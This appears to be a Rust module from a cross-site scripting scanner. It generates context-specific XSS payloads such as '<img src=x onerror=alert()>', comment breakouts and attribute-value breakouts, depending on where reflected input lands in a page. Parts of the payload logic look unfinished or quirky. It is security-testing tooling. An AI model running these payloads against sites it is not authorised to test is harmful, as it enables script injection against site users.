#[path = "parser.rs"] mod parser;
use crate::scan::xss::parser::Location;
use std::collections::HashMap;
use regex::Regex;


pub fn match_qoutes(d: &str,s: &str) -> bool {
    let re = Regex::new(&format!(r#"'(?:[^\\\\'\\\\]|\\\\.)*{}(?:[^\\\\'\\\\]|\\\\.)*'"#,s)).unwrap();
    re.is_match(d)
}

pub fn match_double_qoutes(d: &str, s: &str) -> bool {
    // regex: "(?:[^"\\\\]|\\\\.)*khaled(?:[^"\\\\]|\\\\.)*"
    let c = &format!(r#""*(?:[^"\\\\]|\\\\.)*{}(?:[^"\\\\]|\\\\.)*""#,s);
    let re = Regex::new(c).unwrap();
    re.is_match(d)
}



pub struct PayloadGen<'a> {
    pub location: &'a Location,
    pub response: &'a str,
    pub payload: &'a str,
    pub payloads: Vec<&'a str>,
}

impl <'a> PayloadGen<'a> {
    pub fn new(response: &'a str,location: &'a Location,payload: &'a str,payloads: Vec<&'a str>) -> Self {
        PayloadGen {
            location,
            response,
            payloads,
            payload,
        }
    }

    pub fn get_attr(&self,word: &str) -> Vec<String> {
        let attrs = vec!["onerror","onload","oncopy"];
        let mut payloads = Vec::new();
        for words in attrs.iter() {
            if words.starts_with(word) {
                payloads.push(words.to_string());
            }
        }
        payloads
    }
    pub fn analyze(&self) -> Vec<String> {
        match *self.location {
            Location::Text(ref text) => {
                vec!["<img src=x onerror=alert()>".to_string()]
            },
            Location::TagName(ref tag_name) => {
                let tag_without_payload = tag_name.replace("hackerman","");
                if tag_without_payload.len() == 0 {
                    vec!["img/onerror=alert()".to_string()]
                } else{
                    vec![format!("kokimg/{:?}",self.get_attr(tag_without_payload.as_str()))]
                }        
            },

            Location::Comment(ref comment) => {
                vec!["--><img src=x onerror=alert()>".to_string()]
            },

            Location::AttrName(ref attr_name) => {
                /*
                 * Just match the attribute name
                 * */
                let tag_without_payload = attr_name.replace("hackerman","");
                self.get_attr(tag_without_payload.as_str())
                    .into_iter()
                    .map(|x| format!("{}=alert() f",x.replace("hackerman", "")
                                                     .replace(tag_without_payload.as_str(), "")))
                                                     .collect::<Vec<String>>()
            },

            Location::AttrValue(ref attr_value) => {
                // match if attr_value is a js command
                match match_double_qoutes(self.response,attr_value.as_str()) {
                    true => {
                        vec![
                            "\" onerror=\"alert()".to_string(),
                            "\\\" onerror=\"alert()".to_string(),
                        ]
                    },
                    false => {
                        vec![
                            "''' onerror='alert()".to_string(),
                        ]
                    },
                }
            },
        }

    } 
}


